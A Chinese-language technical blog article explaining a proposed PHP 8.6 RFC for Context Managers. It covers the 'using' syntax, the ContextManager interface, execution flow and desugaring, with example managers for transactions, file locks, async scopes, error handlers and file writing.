.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在日常 PHP 开发中，我们经常需要处理资源的生命周期管理：打开文件后要记得关闭，开启数据库事务后要确保提交或回滚，获取锁后要记得释放……这些重复的"设置-使用-清理"模式充斥着我们的代码，不仅繁琐，还容易出错。</p>
<p>PHP 8.6 即将引入的 <strong>Context Managers（上下文管理器）</strong> 特性，正是为了解决这一问题。这个特性借鉴自 Python，通过新增的 <code>using</code> 关键字和 <code>ContextManager</code> 接口，提供了一种优雅的方式来抽象这些通用的控制流和变量生命周期管理模式。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2025-11%2Fphp-context-managers-rfc-zh" target="_blank" title="https://catchadmin.com/post/2025-11/php-context-managers-rfc-zh" ref="nofollow noopener noreferrer">原文链接 PHP8.6 新的 RFC 提案 Context Managers 优雅管理资源生命周期</a>
让我们看一个典型的例子。传统的文件处理代码需要这样写：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'file.txt'</span>, <span class="hljs-string">'w'</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$fp</span>) {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$someThing</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) {
            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>));
        }
    } <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) {
        <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">'The file failed.'</span>);
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
    }
}
<span class="hljs-keyword">unset</span>(<span class="hljs-variable">$fp</span>);
</code></pre>
<p>而使用 Context Managers 后，可以简化为：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">using</span> (<span class="hljs-title function_ invoke__">file_for_write</span>(<span class="hljs-string">'file.txt'</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$fp</span>) {
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$someThing</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) {
        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>));
    }
}
<span class="hljs-comment">// 此时可以保证 $fp 已经关闭，无论是否发生错误</span>
</code></pre>
<h2 data-id="heading-1">核心概念</h2>
<h3 data-id="heading-2">ContextManager 接口</h3>
<p>Context Managers 的核心是一个新的接口 <code>ContextManager</code>，它定义了两个关键方法：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ContextManager</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enterContext</span>(<span class="hljs-params"/>): <span class="hljs-title">mixed</span></span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exitContext</span>(<span class="hljs-params">?\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span> = <span class="hljs-literal">null</span></span>): ?<span class="hljs-title">bool</span></span>;
}
</code></pre>
<ul>
<li><strong><code>enterContext()</code></strong>：在进入上下文块时调用，执行必要的设置操作，返回值将作为上下文变量提供给代码块使用</li>
<li><strong><code>exitContext()</code></strong>：在离开上下文块时调用，执行清理操作。接收一个可选的异常参数，如果返回 <code>true</code> 则抑制异常，否则异常会重新抛出</li>
</ul>
<h3 data-id="heading-3">using 关键字语法</h3>
<p><code>using</code> 语句的基本语法如下：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">using</span> ((EXPR [<span class="hljs-keyword">as</span> VAR])[,]+) {
    BODY
}
</code></pre>
<p>其中：</p>
<ul>
<li><strong>EXPR</strong>：任意表达式，其结果必须是 <code>ContextManager</code> 实例</li>
<li><strong>VAR</strong>：可选的变量名，用于接收 <code>enterContext()</code> 的返回值</li>
<li><strong>BODY</strong>：任意 PHP 语句</li>
<li><strong>逗号分隔</strong>：可以在一个 <code>using</code> 语句中使用多个上下文管理器，用逗号分隔</li>
</ul>
<p><strong>语法示例</strong>：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 单个上下文管理器，带上下文变量</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileManager</span>(<span class="hljs-string">'file.txt'</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$fp</span>) {
    <span class="hljs-comment">// 使用 $fp</span>
}

<span class="hljs-comment">// 单个上下文管理器，不需要上下文变量</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionManager</span>()) {
    <span class="hljs-comment">// 执行事务性操作</span>
}

<span class="hljs-comment">// 多个上下文管理器</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">LockA</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$a</span>, <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">LockB</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) {
    <span class="hljs-comment">// 同时使用 $a 和 $b</span>
}

<span class="hljs-comment">// 表达式可以是函数调用或方法链</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">transaction</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$tx</span>) {
    <span class="hljs-comment">// 使用事务</span>
}
</code></pre>
<h3 data-id="heading-4">上下文管理器 vs 上下文变量</h3>
<p>需要特别注意的是，<strong>上下文管理器</strong>（ContextManager 实例）和<strong>上下文变量</strong>（<code>as</code> 后面的变量）是两个不同的概念：</p>
<ul>
<li><strong>上下文管理器</strong>：负责管理生命周期的对象，通常对业务代码不可见</li>
<li><strong>上下文变量</strong>：<code>enterContext()</code> 返回的值，这才是业务代码实际使用的对象</li>
</ul>
<p>例如，在文件处理场景中，Context Manager 可能是一个 <code>FileManager</code> 对象，而上下文变量则是实际的文件句柄。</p>
<h2 data-id="heading-5">执行流程详解</h2>
<h3 data-id="heading-6">成功场景</h3>
<p>当代码块正常执行完毕时：</p>
<ol>
<li>验证 EXPR 返回的是 <code>ContextManager</code> 实例（否则抛出 <code>TypeError</code>）</li>
<li>调用 <code>enterContext()</code>，将返回值赋给上下文变量（如果指定了 <code>as VAR</code>）</li>
<li>执行代码块中的语句</li>
<li>调用 <code>exitContext()</code>（不传参数）</li>
<li>显式 <code>unset()</code> 上下文变量</li>
<li>Context Manager 自然超出作用域，被垃圾回收</li>
</ol>
<h3 data-id="heading-7">失败场景</h3>
<p>当代码块中抛出异常时：</p>
<ol>
<li>捕获异常</li>
<li>调用 <code>exitContext($exception)</code>，传入捕获的异常</li>
<li>显式 <code>unset()</code> 上下文变量</li>
<li>如果 <code>exitContext()</code> 返回 <code>true</code>，异常被抑制；否则重新抛出异常</li>
</ol>
<h3 data-id="heading-8">特殊控制语句</h3>
<p>在 <code>using</code> 块中，三个关键字有特殊含义：</p>
<ul>
<li><strong><code>break</code></strong>：跳出 <code>using</code> 块，视为成功场景。如果在嵌套控制结构中，使用 <code>break 2</code> 等来指定跳出层级</li>
<li><strong><code>continue</code></strong>：行为同 <code>break</code>，但会触发警告（与 <code>switch</code> 保持一致）</li>
<li><strong><code>return</code></strong>：从函数返回，先触发成功场景的清理流程，再返回</li>
</ul>
<p><strong>重要说明</strong>：<code>using</code> 块不会创建新的作用域（不像函数或闭包）。这意味着：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$outer</span> = <span class="hljs-string">'outside'</span>;

<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Manager</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$ctx</span>) {
    <span class="hljs-comment">// 可以访问外部变量</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$outer</span>; <span class="hljs-comment">// 输出：outside</span>
    
    <span class="hljs-comment">// 在块内定义的变量</span>
    <span class="hljs-variable">$inner</span> = <span class="hljs-string">'inside'</span>;
}

<span class="hljs-comment">// 上下文变量 $ctx 已被显式 unset，此处不可访问</span>
<span class="hljs-comment">// var_dump($ctx); // 错误：Undefined variable</span>

<span class="hljs-comment">// 但块内定义的其他变量仍然存在</span>
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$inner</span>; <span class="hljs-comment">// 输出：inside</span>
</code></pre>
<h2 data-id="heading-9">实现原理</h2>
<p><code>using</code> 块在编译时会被转换（desugaring）为传统代码。以下是一个简单示例的转换结果：</p>
<p><strong>原始代码</strong>：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Manager</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>) {
    <span class="hljs-keyword">print</span> <span class="hljs-string">"Hello world\n"</span>;
}
</code></pre>
<p><strong>等效转换后的代码</strong>：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 步骤 1: 创建上下文管理器实例</span>
<span class="hljs-variable">$__mgr</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Manager</span>();

<span class="hljs-comment">// 步骤 2: 标记异常处理状态（确保 exitContext 只调用一次）</span>
<span class="hljs-variable">$__closed</span> = <span class="hljs-literal">false</span>;

<span class="hljs-comment">// 步骤 3: 调用 enterContext() 并保存返回值到上下文变量</span>
<span class="hljs-variable">$var</span> = <span class="hljs-variable">$__mgr</span>-&gt;<span class="hljs-title function_ invoke__">enterContext</span>();

<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 步骤 4: 执行用户代码块</span>
    <span class="hljs-keyword">print</span> <span class="hljs-string">"Hello world\n"</span>;
    
} <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) {
    <span class="hljs-comment">// 步骤 5a: 捕获异常时的处理（失败场景）</span>
    <span class="hljs-variable">$__closed</span> = <span class="hljs-literal">true</span>;
    
    <span class="hljs-comment">// 调用 exitContext 并传入异常</span>
    <span class="hljs-variable">$__ret</span> = <span class="hljs-variable">$__mgr</span>-&gt;<span class="hljs-title function_ invoke__">exitContext</span>(<span class="hljs-variable">$e</span>);
    
    <span class="hljs-comment">// 如果返回值不是 true，则重新抛出异常</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$__ret</span> !== <span class="hljs-literal">true</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;
    }
    <span class="hljs-comment">// 如果返回 true，则抑制异常（不再抛出）</span>
    
} <span class="hljs-keyword">finally</span> {
    <span class="hljs-comment">// 步骤 5b/6: 无论如何都会执行的清理代码</span>
    
    <span class="hljs-comment">// 如果没有发生异常（成功场景），调用 exitContext()</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$__closed</span>) {
        <span class="hljs-variable">$__mgr</span>-&gt;<span class="hljs-title function_ invoke__">exitContext</span>();
    }
    
    <span class="hljs-comment">// 显式清理所有相关变量</span>
    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$var</span>);      <span class="hljs-comment">// 清理上下文变量</span>
    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$__closed</span>); <span class="hljs-comment">// 清理状态标记</span>
    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$__mgr</span>);    <span class="hljs-comment">// 清理管理器（触发垃圾回收）</span>
}
</code></pre>
<p><strong>关键要点</strong>：</p>
<ul>
<li><code>$__mgr</code>、<code>$__closed</code>、<code>$__ret</code> 等变量实际上不会以这个名字暴露，这只是为了说明其工作原理</li>
<li><strong><code>exitContext()</code> 保证只会被调用一次</strong>，无论是成功还是失败场景</li>
<li>所有需要在两种情况下执行的清理操作都应该在 <code>exitContext()</code> 中统一处理</li>
<li><code>finally</code> 块确保清理代码一定会执行，即使在 <code>catch</code> 中重新抛出异常</li>
</ul>
<h2 data-id="heading-10">实战应用场景</h2>
<h3 data-id="heading-11">场景一：数据库事务</h3>
<p>数据库事务是 Context Managers 的典型应用场景。传统方式需要手动管理事务的开启、提交和回滚：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DatabaseTransaction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ContextManager</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">private</span> DatabaseConnection <span class="hljs-variable">$connection</span>,
    </span>) </span>{}

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enterContext</span>(<span class="hljs-params"/>): <span class="hljs-title">DatabaseConnection</span>
    </span>{
        <span class="hljs-comment">// 返回数据库连接，供业务代码使用</span>
        <span class="hljs-comment">// 注：实际应用中可能需要在此处调用 beginTransaction()</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;connection;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exitContext</span>(<span class="hljs-params">?\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span> = <span class="hljs-literal">null</span></span>): ?<span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>) {
            <span class="hljs-variable language_">$this</span>-&gt;connection-&gt;<span class="hljs-title function_ invoke__">rollback</span>();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">$this</span>-&gt;connection-&gt;<span class="hljs-title function_ invoke__">commit</span>();
        }
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DatabaseConnection</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transaction</span>(<span class="hljs-params"/>): <span class="hljs-title">DatabaseTransaction</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatabaseTransaction</span>(<span class="hljs-variable language_">$this</span>);
    }
}
</code></pre>
<p>使用时非常简洁：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 注意这里省略了 'as' 表达式，因为不需要返回值</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-variable">$connection</span>-&gt;<span class="hljs-title function_ invoke__">transaction</span>()) {
    <span class="hljs-variable">$connection</span>-&gt;<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">'users'</span>, [<span class="hljs-string">'name'</span> =&gt; <span class="hljs-string">'Alice'</span>]);
    <span class="hljs-variable">$connection</span>-&gt;<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">'logs'</span>, [<span class="hljs-string">'action'</span> =&gt; <span class="hljs-string">'user_created'</span>]);
}
<span class="hljs-comment">// 如果没有异常，事务自动提交；如果有异常，事务自动回滚</span>
</code></pre>
<h3 data-id="heading-12">场景二：文件锁定</h3>
<p>在需要独占访问某个文件时，文件锁定机制至关重要：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ContextManager</span>
</span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$locked</span> = <span class="hljs-literal">false</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span>,
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$forWriting</span> = <span class="hljs-literal">true</span>,
    </span>) </span>{}

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enterContext</span>(<span class="hljs-params"/>): <span class="hljs-title">mixed</span>
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-variable">$this</span>-&gt;forWriting ? <span class="hljs-string">'w'</span> : <span class="hljs-string">'r'</span>);
        <span class="hljs-variable language_">$this</span>-&gt;locked = <span class="hljs-title function_ invoke__">flock</span>(<span class="hljs-variable">$this</span>-&gt;handle, <span class="hljs-variable">$this</span>-&gt;forWriting ? LOCK_EX : LOCK_SH);
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;locked) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\RuntimeException</span>(<span class="hljs-string">'Could not acquire lock.'</span>);
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;handle;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exitContext</span>(<span class="hljs-params">?\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span> = <span class="hljs-literal">null</span></span>): ?<span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;locked) {
            <span class="hljs-title function_ invoke__">flock</span>(<span class="hljs-variable">$this</span>-&gt;handle, LOCK_UN);
        }
        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;handle);
    }
}
</code></pre>
<p>使用示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 需要写入文件的独占访问</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileLock</span>(<span class="hljs-string">'file.txt'</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$fp</span>) {
    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-string">'important stuff'</span>);
}

<span class="hljs-comment">// 仅用于同步，不实际操作文件</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileLock</span>(<span class="hljs-string">'sentinel'</span>)) {
    <span class="hljs-comment">// 执行需要同步的操作，不涉及文件读写</span>
}
</code></pre>
<h3 data-id="heading-13">场景三：结构化异步控制</h3>
<p>Context Managers 也可以用于管理异步协程的生命周期：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BlockingScope</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ContextManager</span>
</span>{
    <span class="hljs-keyword">private</span> Scope <span class="hljs-variable">$scope</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enterContext</span>(<span class="hljs-params"/>): <span class="hljs-title">Scope</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;scope = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scope</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exitContext</span>(<span class="hljs-params">?\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span> = <span class="hljs-literal">null</span></span>): ?<span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>) {
            <span class="hljs-comment">// 发生异常时取消所有协程</span>
            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;scope-&gt;routines <span class="hljs-keyword">as</span> <span class="hljs-variable">$r</span>) {
                <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">cancel</span>();
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 正常退出时等待所有协程完成</span>
            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;scope-&gt;routines <span class="hljs-keyword">as</span> <span class="hljs-variable">$r</span>) {
                <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">wait</span>();
            }
        }
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CancellingScope</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ContextManager</span>
</span>{
    <span class="hljs-keyword">private</span> Scope <span class="hljs-variable">$scope</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enterContext</span>(<span class="hljs-params"/>): <span class="hljs-title">Scope</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;scope = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scope</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exitContext</span>(<span class="hljs-params">?\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span> = <span class="hljs-literal">null</span></span>): ?<span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-comment">// 无论如何都取消所有协程</span>
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;scope-&gt;routines <span class="hljs-keyword">as</span> <span class="hljs-variable">$r</span>) {
            <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">cancel</span>();
        }
    }
}
</code></pre>
<p>使用示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">BlockingScope</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$scope</span>) {
    <span class="hljs-variable">$scope</span>-&gt;<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-title function_ invoke__">someAsyncTask</span>());
    <span class="hljs-variable">$scope</span>-&gt;<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-title function_ invoke__">anotherAsyncTask</span>());
}
<span class="hljs-comment">// 代码会阻塞在这里，直到所有协程完成</span>

<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">CancellingScope</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$scope</span>) {
    <span class="hljs-variable">$scope</span>-&gt;<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-title function_ invoke__">longRunningTask</span>());
    <span class="hljs-variable">$scope</span>-&gt;<span class="hljs-title function_ invoke__">wait</span>(<span class="hljs-number">5</span>); <span class="hljs-comment">// 等待 5 秒</span>
}
<span class="hljs-comment">// 5 秒后所有未完成的协程会被立即取消</span>
</code></pre>
<h3 data-id="heading-14">场景四：临时修改全局配置</h3>
<p>有时需要临时修改某个全局设置，执行完特定代码后恢复：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CustomErrorHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ContextManager</span>
</span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$oldHandler</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$newHandler</span>,
    </span>) </span>{}

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enterContext</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;oldHandler = <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-variable">$this</span>-&gt;newHandler);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exitContext</span>(<span class="hljs-params">?\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span> = <span class="hljs-literal">null</span></span>): ?<span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-variable">$this</span>-&gt;oldHandler);
    }
}
</code></pre>
<p>使用示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 临时禁用所有错误处理</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomErrorHandler</span>(fn() =&gt; <span class="hljs-literal">null</span>)) {
    <span class="hljs-comment">// 在这里"危险地"执行代码</span>
}
<span class="hljs-comment">// 退出块后，之前的错误处理器已自动恢复</span>
</code></pre>
<p>类似的，可以创建用于临时修改 <code>ini</code> 设置的 Context Manager。</p>
<h3 data-id="heading-15">场景五：简化的文件处理</h3>
<p>对于常见的文件操作，可以创建便利的工厂函数：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_for_write</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span></span>): <span class="hljs-title">ContextManager</span>
</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">filename</span>) <span class="hljs-keyword">implements</span> <span class="hljs-title">ContextManager</span> </span>{
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span>;
        
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span></span>) </span>{}
        
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enterContext</span>(<span class="hljs-params"/>): <span class="hljs-title">mixed</span>
        </span>{
            <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-string">'w'</span>);
            <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;handle) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\RuntimeException</span>(<span class="hljs-string">"Cannot open file: <span class="hljs-subst">{$this-&gt;file}</span>"</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;handle;
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exitContext</span>(<span class="hljs-params">?\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span> = <span class="hljs-literal">null</span></span>): ?<span class="hljs-title">bool</span>
        </span>{
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;handle) {
                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;handle);
            }
        }
    };
}
</code></pre>
<p>使用时非常直观：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">using</span> (<span class="hljs-title function_ invoke__">file_for_write</span>(<span class="hljs-string">'output.txt'</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$fp</span>) {
    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-string">"Line 1\n"</span>);
    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-string">"Line 2\n"</span>);
}
<span class="hljs-comment">// 文件自动关闭，无论是否发生异常</span>
</code></pre>
<h2 data-id="heading-16">高级特性</h2>
<h3 data-id="heading-17">嵌套上下文管理器</h3>
<p><code>using</code> 语句支持在一个语句中使用多个上下文管理器，用逗号分隔：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$foo</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bar</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$bar</span>) {
    <span class="hljs-comment">// 可以同时使用 $foo 和 $bar</span>
}
</code></pre>
<p>这等价于嵌套的写法：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$foo</span>) {
    <span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Bar</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$bar</span>) {
        <span class="hljs-comment">// 可以同时使用 $foo 和 $bar</span>
    }
}
</code></pre>
